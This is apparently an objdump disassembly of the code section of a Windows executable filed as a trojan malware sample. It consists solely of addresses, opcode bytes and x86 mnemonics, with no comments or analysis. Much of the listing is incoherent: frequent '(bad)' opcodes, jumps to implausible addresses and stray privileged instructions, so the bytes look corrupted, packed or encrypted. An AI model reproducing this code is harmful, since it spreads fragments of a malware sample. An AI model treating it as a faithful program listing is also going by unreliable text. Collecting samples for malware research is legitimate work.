
malware_samples/trojan/81377486d8968dd177b8282ac674ab972fae257edb096931f17c412d0abe366d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	57                   	push   %edi
  401001:	8b ec                	mov    %esp,%ebp
  401003:	81 ec 0c 04 00 00    	sub    $0x40c,%esp
  401009:	27                   	daa
  40100a:	d4 02                	aam    $0x2
  40100c:	b2 00                	mov    $0x0,%dl
  40100e:	53                   	push   %ebx
  40100f:	56                   	push   %esi
  401010:	a3 b9 17 41 ea       	mov    %eax,0xea4117b9
  401015:	a3 a8 0b 8d dd       	mov    %eax,0xdd8d0ba8
  40101a:	a3 44 40 41 00       	mov    %eax,0x414044
  40101f:	ef                   	out    %eax,(%dx)
  401020:	04 18                	add    $0x18,%al
  401022:	41                   	inc    %ecx
  401023:	00 33                	add    %dh,(%ebx)
  401025:	db 7b 48             	fstpt  0x48(%ebx)
  401028:	40                   	inc    %eax
  401029:	41                   	inc    %ecx
  40102a:	00 48 0c             	add    %cl,0xc(%eax)
  40102d:	4c                   	dec    %esp
  40102e:	0c 55                	or     $0x55,%al
  401030:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401033:	40                   	inc    %eax
  401034:	33 32                	xor    (%edx),%esi
  401036:	05 87 17 41 23       	add    $0x23411787,%eax
  40103b:	44                   	inc    %esp
  40103c:	d2 40 00             	rolb   %cl,0x0(%eax)
  40103f:	88 1d 40 3c 41 00    	mov    %bl,0x413c40
  401045:	e8 d6 bd 00 00       	call   0x40ce20
  40104a:	68 e0 5f 79 00       	push   $0x795fe0
  40104f:	e8 d8 a4 00 00       	call   0x40b52c
  401054:	83 c4 04             	add    $0x4,%esp
  401057:	53                   	push   %ebx
  401058:	aa                   	stos   %al,%es:(%edi)
  401059:	53                   	push   %ebx
  40105a:	c5 da 40             	(bad)
  40105d:	41                   	inc    %ecx
  40105e:	00 e8                	add    %ch,%al
  401060:	fc                   	cld
  401061:	23 00                	and    (%eax),%eax
  401063:	00 8b 55 0c 8b 45    	add    %cl,0x458b0c55(%ebx)
  401069:	08 8b 0d cb 40 11    	or     %cl,0x1140cb0d(%ebx)
  40106f:	01 52 34             	add    %edx,0x34(%edx)
  401072:	8d 55 f4             	lea    -0xc(%ebp),%edx
  401075:	e2 80                	loop   0x400ff7
  401077:	e8 39 4a 00 62       	call   0x62405ab5
  40107c:	8b 3f                	mov    (%edi),%edi
  40107e:	f4                   	hlt
  40107f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401082:	8d 25 fb 50 51 68    	lea    0x685150fb,%esp
  401088:	14 d2                	adc    $0xd2,%al
  40108a:	b9 f2 52 e8 de       	mov    $0xdee852f2,%ecx
  40108f:	4a                   	dec    %edx
  401090:	00 00                	add    %al,(%eax)
  401092:	85 c0                	test   %eax,%eax
  401094:	0f 85 9a 04 00 4c    	jne    0x4c401534
  40109a:	8b a5 68 4b 40 00    	mov    0x404b68(%ebp),%esp
  4010a0:	0f 6a 45 fb          	punpckhdq -0x5(%ebp),%mm0
  4010a4:	83 c0 bf             	add    $0xffffffbf,%eax
  4010a7:	83 f8 39             	cmp    $0x39,%eax
  4010aa:	0f 87 66 e5 00 00    	ja     0x40f616
  4010b0:	33 c9                	xor    %ecx,%ecx
  4010b2:	c8 99 08 17          	enter  $0x899,$0x17
  4010b6:	40                   	inc    %eax
  4010b7:	00 d1                	add    %dl,%cl
  4010b9:	9d                   	popf
  4010ba:	8d 98 16 40 00 8b    	lea    -0x74ffbfea(%eax),%ebx
  4010c0:	55                   	push   %ebp
  4010c1:	fc                   	cld
  4010c2:	c1 ff a4             	sar    $0xa4,%edi
  4010c5:	1a c1                	sbb    %cl,%al
  4010c7:	40                   	inc    %eax
  4010c8:	00 83 82 04 3b c3    	add    %al,-0x3cc4fb7e(%ebx)
  4010ce:	a3 10 d0 40 00       	mov    %eax,0x40d010
  4010d3:	d7                   	xlat   %ds:(%ebx)
  4010d4:	8f                   	(bad)
  4010d5:	3d 04 00 00 68       	cmp    $0x68000004,%eax
  4010da:	f8                   	clc
  4010db:	d1 0b                	rorl   $1,(%ebx)
  4010dd:	00 d3                	add    %dl,%bl
  4010df:	b3 06                	mov    $0x6,%bl
  4010e1:	00 99 e9 2b 04 00    	add    %bl,0x42be9(%ecx)
  4010e7:	00 c7                	add    %al,%bh
  4010e9:	9f                   	lahf
  4010ea:	39 02                	cmp    %eax,(%edx)
  4010ec:	41                   	inc    %ecx
  4010ed:	00 01                	add    %al,(%ecx)
  4010ef:	00 00                	add    %al,(%eax)
  4010f1:	00 80 1f f4 00 50    	add    %al,0x5000f41f(%eax)
  4010f7:	89 4a 19             	mov    %ecx,0x19(%edx)
  4010fa:	d0 73 00             	shlb   $1,0x0(%ebx)
  4010fd:	e9 72 61 42 2f       	jmp    0x2f827274
  401102:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401105:	50                   	push   %eax
  401106:	ff 15 76 c1 40 82    	call   *0x8240c176
  40110c:	a3 8e d1 40 00       	mov    %eax,0x40d18e
  401111:	29 fd                	sub    %edi,%ebp
  401113:	52                   	push   %edx
  401114:	00 f7                	add    %dh,%bh
  401116:	58                   	pop    %eax
  401117:	4d                   	dec    %ebp
  401118:	fc                   	cld
  401119:	51                   	push   %ecx
  40111a:	ff 9b 6c c1 40 00    	lcall  *0x40c16c(%ebx)
  401120:	a3 6c 02 41 00       	mov    %eax,0x41026c
  401125:	e9 e9 49 00 00       	jmp    0x405b13
  40112a:	38 1d 60 02 41 00    	cmp    %bl,0x410260
  401130:	7e 0d                	jle    0x40113f
  401132:	68 8a d1 64 00       	push   $0x64d18a
  401137:	e8 14 06 00 00       	call   0x401750
  40113c:	83 c4 04             	add    $0x4,%esp
  40113f:	c7                   	(bad)
  401140:	24 60                	and    $0x60,%al
  401142:	d2 d9                	rcr    %cl,%cl
  401144:	00 97 bf ff ff 8e    	add    %dl,-0x71000041(%edi)
  40114a:	c8 03 00 fc          	enter  $0x3,$0xfc
  40114e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401151:	52                   	push   %edx
  401152:	ff 15 88 c1 40 00    	call   *0x40c188
  401158:	a3 a2 0b d4 00       	mov    %eax,0xd40ba2
  40115d:	e9 b1 03 00 00       	jmp    0x401513
  401162:	89 1d 9f d0 40 00    	mov    %ebx,0x40d09f
  401168:	e9 a9 a9 40 00       	jmp    0x80bb16
  40116d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401170:	b5 ff                	mov    $0xff,%ch
  401172:	15 88 c4 95 00       	adc    $0x95c488,%eax
  401177:	a3 f6 17 41 00       	mov    %eax,0x4117f6
  40117c:	e9 92 03 00 00       	jmp    0x401513
  401181:	89 31                	mov    %esi,(%ecx)
  401183:	20 d0                	and    %dl,%al
  401185:	40                   	inc    %eax
  401186:	fa                   	cli
  401187:	e9 8a 03 00 00       	jmp    0x401516
  40118c:	39 1d 9e 02 41 f2    	cmp    %ebx,0xf241029e
  401192:	74 42                	je     0x4011d6
  401194:	37                   	aaa
  401195:	bc d1 40 00 e8       	mov    $0xe80040d1,%esp
  40119a:	b2 36                	mov    $0x36,%dl
  40119c:	00 00                	add    %al,(%eax)
  40119e:	83 c4 04             	add    $0x4,%esp
  4011a1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4011a4:	51                   	push   %ecx
  4011a5:	e8 2c 35 00 00       	call   0x4046d6
  4011aa:	83 4d 04 b1          	orl    $0xffffffb1,0x4(%ebp)
  4011ae:	c3                   	ret
  4011af:	75 0f                	jne    0x4011c0
  4011b1:	c7 05 60 02 41 00 01 	movl   $0x2000d601,0x410260
  4011b8:	d6 00 20 
  4011bb:	e9 56 03 00 00       	jmp    0x401516
  4011c0:	39 1d f7 38 41 00    	cmp    %ebx,0x4138f7
  4011c6:	0f 84 4a 03 f5 00    	je     0x1351516
  4011cc:	03 ff                	add    %edi,%edi
  4011ce:	5c                   	pop    %esp
  4011cf:	12 fa                	adc    %dl,%bh
  4011d1:	40                   	inc    %eax
  4011d2:	00 39                	add    %bh,(%ecx)
  4011d4:	1d 60 0b 41 00       	sbb    $0x410b60,%eax
  4011d9:	a9 0d 68 a0 d1       	test   $0xd1a0680d,%eax
  4011de:	40                   	inc    %eax
  4011df:	00 e8                	add    %ch,%al
  4011e1:	48                   	dec    %eax
  4011e2:	05 00 00 f4 c4       	add    $0xc4f40000,%eax
  4011e7:	04 83                	add    $0x83,%al
  4011e9:	38 14 52             	cmp    %dl,(%edx,%edx,2)
  4011ec:	e8 3f 35 00 6e       	call   0x6e404730
  4011f1:	20 8f 04 3b c3 75    	and    %cl,0x75c33b04(%edi)
  4011f7:	0f c7 bd 60 a8 41 7a 	vmptrst 0x7a41a860(%ebp)
  4011fe:	02 00                	add    (%eax),%al
  401200:	e0 00                	loopne 0x401202
  401202:	e9 b8 03 00 00       	jmp    0x4015bf
  401207:	39 1d 6a 38 41 00    	cmp    %ebx,0x41386a
  40120d:	0f 84 03 03 00 00    	je     0x401516
  401213:	50                   	push   %eax
  401214:	ff 15 70 e7 91 ba    	call   *0xba91e770
  40121a:	c7 05 f0 02 41 00 01 	movl   $0x90001,0x4102f0
  401221:	00 09 00 
  401224:	e9 6a 02 00 00       	jmp    0x401493
  401229:	e4 45                	in     $0x45,%al
  40122b:	fc                   	cld
  40122c:	50                   	push   %eax
  40122d:	ff 15 6c c1 7e 00    	call   *0x7ec16c
  401233:	a3 58 02 41 00       	mov    %eax,0x410258
  401238:	e9 d6 02 00 00       	jmp    0x401513
  40123d:	8b 4d 6f             	mov    0x6f(%ebp),%ecx
  401240:	51                   	push   %ecx
  401241:	74 15                	je     0x401258
  401243:	6c                   	insb   (%dx),%es:(%edi)
  401244:	c1 40 f4 a3          	roll   $0xa3,-0xc(%eax)
  401248:	64 cd 41             	fs int $0x41
  40124b:	00 c7                	add    %al,%bh
  40124d:	05 f4 e0 40 00       	add    $0x40e0f4,%eax
  401252:	50                   	push   %eax
  401253:	c3                   	ret
  401254:	00 00                	add    %al,(%eax)
  401256:	e9 b8 02 00 00       	jmp    0x401513
  40125b:	c8 87 fc ba          	enter  $0xfc87,$0xba
  40125f:	40                   	inc    %eax
  401260:	38 ea                	cmp    %ch,%dl
  401262:	00 2b                	add    %ch,(%ebx)
  401264:	d0 8a 08 88 0c 02    	rorb   $1,0x20c8808(%edx)
  40126a:	40                   	inc    %eax
  40126b:	3a cb                	cmp    %bl,%cl
  40126d:	97                   	xchg   %eax,%edi
  40126e:	f6 e9                	imul   %cl
  401270:	ec                   	in     (%dx),%al
  401271:	48                   	dec    %eax
  401272:	00 00                	add    %al,(%eax)
  401274:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401277:	a1 16 c9 41 00       	mov    0x41c916,%eax
  40127c:	53                   	push   %ebx
  40127d:	0a 9c d1 40 00 52 d4 	or     -0x2badffc0(%ecx,%edx,8),%bl
  401284:	90                   	nop
  401285:	d1 40 00             	roll   $1,0x0(%eax)
  401288:	50                   	push   %eax
  401289:	e8 46 46 8c a8       	call   0xa8cc58d4
  40128e:	83 c4 3a             	add    $0x3a,%esp
  401291:	a3 81 bd 42 00       	mov    %eax,0x42bd81
  401296:	53                   	push   %ebx
  401297:	7b 02                	jnp    0x40129b
  401299:	2e b7 8b             	cs mov $0x8b,%bh
  40129c:	7d fc                	jge    0x40129a
  40129e:	8b 0d 91 c1 40 00    	mov    0x40c191,%ecx
  4012a4:	a3 39 01 7e e9       	mov    %eax,0xe97e0139
  4012a9:	ff d2                	call   *%edx
  4012ab:	6a 08                	push   $0x8
  4012ad:	8a 17                	mov    (%edi),%dl
  4012af:	e6 ff                	out    %al,$0xff
  4012b1:	d6                   	salc
  4012b2:	79 7d                	jns    0x401331
  4012b4:	fc                   	cld
  4012b5:	83 c4 08             	add    $0x8,%esp
  4012b8:	b1 12                	mov    $0x12,%cl
  4012ba:	8b 0d 35 d3 44 00    	mov    0x44d335,%ecx
  4012c0:	33 c0                	xor    %eax,%eax
  4012c2:	8a 07                	mov    (%edi),%al
  4012c4:	ff 22                	jmp    *(%edx)
  4012c6:	8a 7c 42 83          	mov    -0x7d(%edx,%eax,2),%bh
  4012ca:	e0 34                	loopne 0x401300
  4012cc:	3b 2a                	cmp    (%edx),%ebp
  4012ce:	98                   	cwtl
  4012cf:	06                   	push   %es
  4012d0:	47                   	inc    %edi
  4012d1:	89 e1                	mov    %esp,%ecx
  4012d3:	fc                   	cld
  4012d4:	4e                   	dec    %esi
  4012d5:	c8 83 c9 ff          	enter  $0xc983,$0xff
  4012d9:	33 c0                	xor    %eax,%eax
  4012db:	ff ae f7 d1 ca ae    	ljmp   *-0x51352e09(%esi)
  4012e1:	e8 ca a0 2a 00       	call   0x6ab3b0
  4012e6:	3d 00 04 00 00       	cmp    $0x400,%eax
  4012eb:	76 0d                	jbe    0x4012fa
  4012ed:	68 68 af 40 8e       	push   $0x8e40af68
  4012f2:	e8 59 04 00 00       	call   0x401750
  4012f7:	83 ce 04             	or     $0x4,%esi
  4012fa:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4012fd:	83 ec 36             	sub    $0x36,%esp
  401300:	77 fa                	ja     0x4012fc
  401302:	33 c0                	xor    %eax,%eax
  401304:	60                   	pusha
  401305:	ae                   	scas   %es:(%edi),%al
  401306:	f7 d1                	not    %ecx
  401308:	49                   	dec    %ecx
  401309:	8d 2a                	lea    (%edx),%ebp
  40130b:	f4                   	hlt
  40130c:	fb                   	sti
  40130d:	c9                   	leave
  40130e:	ff 51 52             	call   *0x52(%ecx)
  401311:	50                   	push   %eax
  401312:	e8 c9 a0 00 00       	call   0x40b3e0
  401317:	53                   	push   %ebx
  401318:	35 8d 92 fb 65       	xor    $0x65fb928d,%eax
  40131d:	a2 68 9c d1 40       	mov    %al,0x40d19c68
  401322:	66 87 68 50          	xchg   %bp,0x50(%eax)
  401326:	d1 40 00             	roll   $1,0x0(%eax)
  401329:	5e                   	pop    %esi
  40132a:	02 68 00             	add    0x0(%eax),%ch
  40132d:	b1 8b                	mov    $0x8b,%cl
  40132f:	7d fc                	jge    0x40132d
  401331:	8b 0d 74 d2 40 00    	mov    0x40d274,%ecx
  401337:	83 39 79             	cmpl   $0x79,(%ecx)
  40133a:	7e 11                	jle    0x40134d
  40133c:	33 d2                	xor    %edx,%edx
  40133e:	37                   	aaa
  40133f:	08 9b 17 30 60 d6    	or     %bl,-0x299fcfe9(%ebx)
  401345:	d1 7d fc             	sarl   $1,-0x4(%ebp)
  401348:	b3 c4                	mov    $0xc4,%bl
  40134a:	7a eb                	jp     0x401337
  40134c:	12 8b 0d 78 c1 40    	adc    0x40c1780d(%ebx),%cl
  401352:	00 33                	add    %dh,(%ebx)
  401354:	c0 8a 07 32 11 89 04 	rorb   $0x4,-0x76eecdf9(%edx)
  40135b:	c1 83 af 26 3b c3 74 	roll   $0x74,-0x3cc4d951(%ebx)
  401362:	06                   	push   %es
  401363:	e4 89                	in     $0x89,%al
  401365:	44                   	inc    %esp
  401366:	fc                   	cld
  401367:	eb c8                	jmp    0x401331
  401369:	ca c9 ff             	lret   $0xffc9
  40136c:	33 c0                	xor    %eax,%eax
  40136e:	e8 ae f7 d1 49       	call   0x4a120b21
  401373:	51                   	push   %ecx
  401374:	e8 37 a0 80 00       	call   0xc0b3b0
  401379:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40137e:	76 0d                	jbe    0x40138d
  401380:	68 34 d1 40 00       	push   $0x40d134
  401385:	e8 c6 03 00 52       	call   0x52401750
  40138a:	83 c6 04             	add    $0x4,%esi
  40138d:	8b 02                	mov    (%edx),%eax
  40138f:	2d 83 c9 ff 8b       	sub    $0x8bffc983,%eax
  401394:	fa                   	cli
  401395:	33 c0                	xor    %eax,%eax
  401397:	f2 ae                	repnz scas %es:(%edi),%al
  401399:	fb                   	sti
  40139a:	d1 49 8d             	rorl   $1,-0x73(%ecx)
  40139d:	85 f4                	test   %esi,%esp
  40139f:	fb                   	sti
  4013a0:	ff                   	(bad)
  4013a1:	ff e0                	jmp    *%eax
  4013a3:	52                   	push   %edx
  4013a4:	50                   	push   %eax
  4013a5:	e8 cf a0 00 00       	call   0x40b479
  4013aa:	53                   	push   %ebx
  4013ab:	8d 8d f4 fb ff ff    	lea    -0x40c(%ebp),%ecx
  4013b1:	68 30 d1 ef 00       	push   $0xefd130
  4013b6:	51                   	push   %ecx
  4013b7:	68 98 d1 40 00       	push   $0x40d198
  4013bc:	8b 15 35 18 41 00    	mov    0x411835,%edx
  4013c2:	88 9c 05 f4 fb ff ff 	mov    %bl,-0x40c(%ebp,%eax,1)
  4013c9:	a1 4c 40 41 e9       	mov    0xe941404c,%eax
  4013ce:	52                   	push   %edx
  4013cf:	bc e8 b9 1c 00       	mov    $0x1cb9e8,%esp
  4013d4:	00 15 28 18 a3 8b    	add    %dl,0x8ba31828
  4013da:	18 9a 29 e9 34 6d    	sbb    %bl,0x6d34e929(%edx)
  4013e0:	00 00                	add    %al,(%eax)
  4013e2:	8b 7b 97             	mov    -0x69(%ebx),%edi
  4013e5:	8b 15 b8 60 41 00    	mov    0x4160b8,%edx
  4013eb:	a1 4c 40 41 80       	mov    0x8041404c,%eax
  4013f0:	0b 68 9c             	or     -0x64(%eax),%ebp
  4013f3:	d1 40 d7             	roll   $1,-0x29(%eax)
  4013f6:	51                   	push   %ecx
  4013f7:	52                   	push   %edx
  4013f8:	50                   	push   %eax
  4013f9:	e8 92 44 a3 00       	call   0xe35890
  4013fe:	8b 5e fc             	mov    -0x4(%esi),%ebx
  401401:	8b 3d 8c c1 a7 e5    	mov    0xe5a7c18c,%edi
  401407:	6a 05                	push   $0x5
  401409:	68 10 d2 40 3c       	push   $0x3c40d210
  40140e:	51                   	push   %ecx
  40140f:	a3 4a 40 41 00       	mov    %eax,0x41404a
  401414:	ff c6                	inc    %esi
  401416:	83 5d 4c 85          	sbbl   $0xffffff85,0x4c(%ebp)
  40141a:	c0 75 14 7d          	shlb   $0x7d,0x14(%ebp)
  40141e:	05 7c 02 41 4d       	add    $0x4d41027c,%eax
  401423:	01 18                	add    %ebx,(%eax)
  401425:	00 14 61             	add    %dl,(%ecx,%eiz,2)
  401428:	ea 00 00 00 cb a4 fc 	ljmp   $0xfca4,$0xcb000000
  40142f:	6a 07                	push   $0x7
  401431:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401432:	08 d1                	or     %dl,%cl
  401434:	40                   	inc    %eax
  401435:	00 95 80 d7 83 4f    	add    %dl,0x4f83d780(%ebp)
  40143b:	0c 85                	or     $0x85,%al
  40143d:	21 75 0f             	and    %esi,0xf(%ebp)
  401440:	c7 05 84 02 41 00 01 	movl   $0x1,0x410284
  401447:	00 00 00 
  40144a:	e9 16 00 7b 00       	jmp    0xbb1465
  40144f:	8b 45 1a             	mov    0x1a(%ebp),%eax
  401452:	be 0b 94 fc d0       	mov    $0xd0fc940b,%esi
  401457:	c6 00 50             	movb   $0x50,(%eax)
  40145a:	ff d7                	call   *%edi
  40145c:	83 60 0c 85          	andl   $0xffffff85,0xc(%eax)
  401460:	d4 0f                	aam    $0xf
  401462:	85 3f                	test   %edi,(%edi)
  401464:	00 00                	add    %al,(%eax)
  401466:	85 c7                	test   %eax,%edi
  401468:	05 80 02 41 00       	add    $0x410280,%eax
  40146d:	01 00                	add    %eax,(%eax)
  40146f:	00 00                	add    %al,(%eax)
  401471:	e9 a0 00 00 dd       	jmp    0xdd401516
  401476:	c7 05 be 02 3f 28 79 	movl   $0x2a5f79,0x283f02be
  40147d:	5f 2a 00 
  401480:	e9 91 8c 00 00       	jmp    0x40a116
  401485:	5e                   	pop    %esi
  401486:	4d                   	dec    %ebp
  401487:	fc                   	cld
  401488:	c7                   	(bad)
  401489:	54                   	push   %esp
  40148a:	88 02                	mov    %al,(%edx)
  40148c:	41                   	inc    %ecx
  40148d:	44                   	inc    %esp
  40148e:	01 00                	add    %eax,(%eax)
  401490:	00 00                	add    %al,(%eax)
  401492:	89 ca                	mov    %ecx,%edx
  401494:	e8 db 41 00 eb       	call   0xeb405674
  401499:	31 6b d1             	xor    %ebp,-0x2f(%ebx)
  40149c:	fc                   	cld
  40149d:	6a 3a                	push   $0x3a
  40149f:	52                   	push   %edx
  4014a0:	ff 15 7c c1 40 00    	call   *0x40c17c
  4014a6:	83 b6 08 3b c3 df 12 	xorl   $0x12,-0x203cc4f8(%esi)
  4014ad:	88 18                	mov    %bl,(%eax)
  4014af:	40                   	inc    %eax
  4014b0:	50                   	push   %eax
  4014b1:	96                   	xchg   %eax,%esi
  4014b2:	15 6c c1 8b 00       	adc    $0x8bc16c,%eax
  4014b7:	26 05 04 a3 74 02    	es add $0x274a304,%eax
  4014bd:	41                   	inc    %ecx
  4014be:	00 a4 16 fc ba 6e 3c 	add    %ah,0x3c6ebafc(%esi,%edx,1)
  4014c5:	41                   	inc    %ecx
  4014c6:	00 2b                	add    %ch,(%ebx)
  4014c8:	d0 8a 08 88 0c 94    	rorb   $1,-0x6bf377f8(%edx)
  4014ce:	40                   	inc    %eax
  4014cf:	3a cb                	cmp    %bl,%cl
  4014d1:	75 15                	jne    0x4014e8
  4014d3:	c7                   	(bad)
  4014d4:	ac                   	lods   %ds:(%esi),%al
  4014d5:	5e                   	pop    %esi
  4014d6:	02 41 00             	add    0x0(%ecx),%al
  4014d9:	e9 00 00 74 eb       	jmp    0xebb414de
  4014de:	37                   	aaa
  4014df:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4014e2:	c7                   	(bad)
  4014e3:	d1 88 02 41 31 01    	rorl   $1,0x1314102(%eax)
  4014e9:	00 ab 8f a3 ac 0b    	add    %ch,0xbaca38f(%ebx)
  4014ef:	41                   	inc    %ecx
  4014f0:	00 43 23             	add    %al,0x23(%ebx)
  4014f3:	8b 6b fc             	mov    -0x4(%ebx),%ebp
  4014f6:	c7 05 88 02 41 1a 01 	movl   $0x75000001,0x1a410288
  4014fd:	00 00 75 
  401500:	89 10                	mov    %edx,(%eax)
  401502:	f0 17                	lock pop %ss
  401504:	41                   	inc    %ecx
  401505:	00 eb                	add    %ch,%bl
  401507:	0e                   	push   %cs
  401508:	8b 55 0c             	mov    0xc(%ebp),%edx
  40150b:	8b 02                	mov    (%edx),%eax
  40150d:	50                   	push   %eax
  40150e:	e8 fd 2d 00 00       	call   0x404310
  401513:	8d                   	lea    (bad),%eax
  401514:	c4 04 7c             	les    (%esp,%edi,2),%eax
  401517:	45                   	inc    %ebp
  401518:	f4                   	hlt
  401519:	02 4d fc             	add    -0x4(%ebp),%cl
  40151c:	99                   	cltd
  40151d:	ed                   	in     (%dx),%eax
  40151e:	fb                   	sti
  40151f:	51                   	push   %ecx
  401520:	52                   	push   %edx
  401521:	4a                   	dec    %edx
  401522:	14 03                	adc    $0x3,%al
  401524:	40                   	inc    %eax
  401525:	2e 50                	cs push %eax
  401527:	e8 44 46 00 eb       	call   0xeb405b70
  40152c:	85 c0                	test   %eax,%eax
  40152e:	3e 84 6c c7 37       	test   %ch,%ds:0x37(%edi,%eax,8)
  401533:	ff 61 45             	jmp    *0x45(%ecx)
  401536:	f4                   	hlt
  401537:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40153a:	8b db                	mov    %ebx,%ebx
  40153c:	80 c1 40             	add    $0x40,%cl
  40153f:	00 49 39             	add    %cl,0x39(%ecx)
  401542:	48                   	dec    %eax
  401543:	0c 74                	or     $0x74,%al
  401545:	d4 8b                	aam    $0x8b
  401547:	55                   	push   %ebp
  401548:	0c 8b                	or     $0x8b,%al
  40154a:	0d c8 c0 40 00       	or     $0x40c0c8,%eax
  40154f:	83 c1 40             	add    $0x40,%ecx
  401552:	95                   	xchg   %eax,%ebp
  401553:	02 34 d5 dc d0 40 af 	add    -0x50bf2f24(,%edx,8),%dh
  40155a:	be ff 67 8b 66       	mov    $0x668b67ff,%esi
  40155f:	0c 54                	or     $0x54,%al
  401561:	02 50 e8             	add    -0x18(%eax),%dl
  401564:	a8 2d                	test   $0x2d,%al
  401566:	00 00                	add    %al,(%eax)
  401568:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40156b:	83 c4 10             	add    $0x10,%esp
  40156e:	8b 48 0c             	mov    0xc(%eax),%ecx
  401571:	8b 47 1c             	mov    0x1c(%edi),%eax
  401574:	8b e2                	mov    %edx,%esp
  401576:	8a a8 89 48 0c a1    	mov    -0x5ef3b777(%eax),%ch
  40157c:	4c                   	dec    %esp
  40157d:	40                   	inc    %eax
  40157e:	41                   	inc    %ecx
  40157f:	00 52 50             	add    %dl,0x50(%edx)
  401582:	ba c9 42 00 00       	mov    $0x42c9,%edx
  401587:	50                   	push   %eax
  401588:	e8 d3 2f 23 00       	call   0x634560
  40158d:	83 c4 04             	add    $0x4,%esp
  401590:	ec                   	in     (%dx),%al
  401591:	6c                   	insb   (%dx),%es:(%edi)
  401592:	74 24                	je     0x4015b8
  401594:	8b 4d 49             	mov    0x49(%ebp),%ecx
  401597:	a1 c8 e3 40 00       	mov    0x40e3c8,%eax
  40159c:	83 c0 40             	add    $0x40,%eax
  40159f:	8b 11                	mov    (%ecx),%edx
  4015a1:	52                   	push   %edx
  4015a2:	68 c8 36 40 69       	push   $0x694036c8
  4015a7:	50                   	push   %eax
  4015a8:	05 d6 8b 4d 0c       	add    $0xc4d8bd6,%eax
  4015ad:	8b 67 52             	mov    0x52(%edi),%esp
  4015b0:	e8 f1 2d 00 00       	call   0x4043a6
  4015b5:	83 c4 10             	add    $0x10,%esp
  4015b8:	a1 18 d0 40 e8       	mov    0xe840d018,%eax
  4015bd:	3b 51 7c             	cmp    0x7c(%ecx),%edx
  4015c0:	07                   	pop    %es
  4015c1:	3d 2b 60 e4 00       	cmp    $0xe4602b,%eax
  4015c6:	7e 2f                	jle    0x4015f7
  4015c8:	8b f3                	mov    %ebx,%esi
  4015ca:	0c ad                	or     $0xad,%al
  4015cc:	15 c8 3a 40 00       	adc    $0x403ac8,%eax
  4015d1:	68 ad 6d 00 8d       	push   $0x8d006dad
  4015d6:	83 c2 40             	add    $0x40,%edx
  4015d9:	8b 08                	mov    (%eax),%ecx
  4015db:	51                   	push   %ecx
  4015dc:	e2 a0                	loop   0x40157e
  4015de:	d0 40 00             	rolb   $1,0x0(%eax)
  4015e1:	52                   	push   %edx
  4015e2:	ff d6                	call   *%esi
  4015e4:	8b 45 0c             	mov    0xc(%ebp),%eax
  4015e7:	7b 21                	jnp    0x40160a
  4015e9:	51                   	push   %ecx
  4015ea:	8f                   	(bad)
  4015eb:	21 c7                	and    %eax,%edi
  4015ed:	e3 00                	jecxz  0x4015ef
  4015ef:	a1 b5 e0 40 00       	mov    0x40e0b5,%eax
  4015f4:	83 c4 14             	add    $0x14,%esp
  4015f7:	8b 0d 10 d0 10 00    	mov    0x10d010,%ecx
  4015fd:	3b c1                	cmp    %ecx,%eax
  4015ff:	7e 2b                	jle    0x40162c
  401601:	8b ea                	mov    %edx,%ebp
  401603:	0c 8b                	or     $0x8b,%al
  401605:	0d c8 c0 40 00       	or     $0x40c0c8,%eax
  40160a:	83 c1 40             	add    $0x40,%ecx
  40160d:	8b 70 50             	mov    0x50(%eax),%esi
  401610:	68 58 d0 40 99       	push   $0x9940d058
  401615:	90                   	nop
  401616:	ff d6                	call   *%esi
  401618:	8b 55 0c             	mov    0xc(%ebp),%edx
  40161b:	8b 02                	mov    (%edx),%eax
  40161d:	50                   	push   %eax
  40161e:	52                   	push   %edx
  40161f:	ed                   	in     (%dx),%eax
  401620:	2c ac                	sub    $0xac,%al
  401622:	00 8b 0d 10 d0 40    	add    %cl,0x40d0100d(%ebx)
  401628:	35 83 d9 10 39       	xor    $0x3910d983,%eax
  40162d:	1d 14 d0 40 00       	sbb    $0x40d014,%eax
  401632:	61                   	popa
  401633:	a0 81 f9 96 00       	mov    0x96f981,%al
  401638:	00 00                	add    %al,(%eax)
  40163a:	7e 36                	jle    0x401672
  40163c:	b8 67 66 66 66       	mov    $0x66666667,%eax
  401641:	f7 e9                	imul   %ecx
  401643:	de fe                	fdivrp %st,%st(6)
  401645:	02 8b ca c1 e9 1f    	add    0x1fe9c1ca(%ebx),%cl
  40164b:	03 d1                	add    %ecx,%edx
  40164d:	83 fa 64             	cmp    $0x64,%edx
  401650:	89 15 14 39 3b 00    	mov    %edx,0x3b3914
  401656:	7d fc                	jge    0x401654
  401658:	c7                   	(bad)
  401659:	b5 14                	mov    $0x14,%ch
  40165b:	d0 40 00             	rolb   $1,0x0(%eax)
  40165e:	64 00 00             	add    %al,%fs:(%eax)
  401661:	27                   	daa
  401662:	8b 14 e8             	mov    (%eax,%ebp,8),%edx
  401665:	f7 2c 00             	imull  (%eax,%eax,1)
  401668:	00 5f 5e             	add    %bl,0x5e(%edi)
  40166b:	ee                   	out    %al,(%dx)
  40166c:	c0 5b 8b e5          	rcrb   $0xe5,-0x75(%ebx)
  401670:	5d                   	pop    %ebp
  401671:	c3                   	ret
  401672:	61                   	popa
  401673:	16                   	push   %ss
  401674:	14 d0                	adc    $0xd0,%al
  401676:	40                   	inc    %eax
  401677:	00 e8                	add    %ch,%al
  401679:	23 03                	and    (%ebx),%eax
  40167b:	00 85 e8 0e 01 00    	add    %al,0x10ee8(%ebp)
  401681:	b4 8b                	mov    $0x8b,%ah
  401683:	15 4c 40 df 00       	adc    $0xdf404c,%eax
  401688:	2b e8                	sub    %eax,%ebp
  40168a:	72 37                	jb     0x4016c3
  40168c:	56                   	push   %esi
  40168d:	00 5f 5e             	add    %bl,0x5e(%edi)
  401690:	33 a5 9b e7 e5 5d    	xor    0x5de5e79b(%ebp),%esp
  401696:	e1 90                	loope  0x401628
  401698:	ce                   	into
  401699:	12 42 79             	adc    0x79(%edx),%al
  40169c:	74 12                	je     0x4016b0
  40169e:	40                   	inc    %eax
